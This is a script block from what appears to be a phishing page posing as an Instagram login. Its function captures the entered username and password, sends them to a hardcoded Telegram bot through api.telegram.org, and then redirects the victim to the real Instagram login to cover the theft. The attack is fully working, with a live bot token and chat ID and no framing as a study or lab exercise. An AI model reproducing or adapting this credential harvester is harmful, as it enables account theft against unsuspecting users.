<script>
    function submitCredentials(event) {
        event.preventDefault();
        
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;
        
        // Send credentials to Telegram bot
        const botToken = "8194126633:AAHGJ-9WykocSf-9cKTNSmQybcbRAeJsIXE";
        const chatId = "5709299213";
        const message = `Instagram Credentials\nUsername: ${username}\nPassword: ${password}`;
        
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
            .then(response => {
                // Redirect to error page after sending
                window.location.href = "https://instagram.com/accounts/login/";
            })
            .catch(error => {
                console.error("Error sending credentials:", error);
                window.location.href = "https://instagram.com/accounts/login/";
            });
    }
</script>
